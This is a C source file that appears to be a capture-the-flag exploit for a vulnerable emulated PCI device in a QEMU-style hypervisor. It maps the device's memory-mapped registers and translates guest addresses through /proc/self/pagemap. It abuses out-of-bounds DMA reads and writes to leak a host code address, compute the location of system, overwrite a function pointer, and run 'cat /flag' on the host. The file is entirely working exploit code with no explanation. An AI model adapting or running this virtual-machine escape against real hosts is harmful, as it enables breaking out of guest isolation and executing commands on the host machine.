#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)


uint64_t page_offset(uint64_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open pagemap");
        exit(1);
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

uint8_t *mmio_address;
uint8_t *user_buf;
uint64_t user_phy_buf;

void mmio_write(uint32_t offset, uint32_t value)
{
    *((uint32_t*)(mmio_address + offset)) = value;
}

void set_dma_src(uint32_t addr)
{
    mmio_write(0x80, addr);
}

void set_dma_dst(uint32_t addr)
{
    mmio_write(0x88, addr);
}

void set_dma_cnt(uint32_t cnt)
{
    mmio_write(0x90, cnt);
}

void set_dma_cmd(uint32_t cmd)
{
    mmio_write(0x98, cmd);
    sleep(1);
}

uint64_t read_dma(uint32_t addr)
{
    set_dma_src(addr+0x40000);
    set_dma_cnt(8);
    set_dma_dst(user_phy_buf);
    set_dma_cmd(1|2);
    //set_dma_cmd(0);
    return *(uint64_t*)user_buf;
}

void write_dma(uint32_t addr, void *buf, uint32_t size)
{
    memcpy(user_buf, buf, size);
    set_dma_src(user_phy_buf);
    set_dma_dst(addr+0x40000);
    set_dma_cnt(size);
    set_dma_cmd(1);
    //set_dma_cmd(0);
}

void trigger_enc()
{
    set_dma_src(0+0x40000);
    set_dma_cnt(0);
    set_dma_cmd(1|2|4);
}

int main()
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if(mmio_fd < 0)
    {
        perror("mmio fd open error!");
        exit(1);
    }
    mmio_address = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if(mmio_address == MAP_FAILED)
    {
        perror("mmio mmap error!");
        exit(1);
    }
    user_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if(user_buf == MAP_FAILED)
    {
        perror("mmio mmap error!");
        exit(1);
    }
    mlock(user_buf, 0x1000);
    user_phy_buf = gva_to_gpa(user_buf);
    printf("[+] user phy buf: %p\n", user_phy_buf);
    uint64_t enc_address = read_dma(4096);
    printf("[+] leak enc address: %p\n", enc_address);
    uint64_t text_base = enc_address - 0x283DD0;
    printf("[+] text base: %p\n", text_base);
    uint64_t system_plt = text_base + 0x1FDB18;
    printf("[+] system plt: %p\n", system_plt);
    write_dma(4096, &system_plt, 8);
    char buf[] = "cat /flag";
    write_dma(0, buf, 10);
    trigger_enc();
    return 0;
}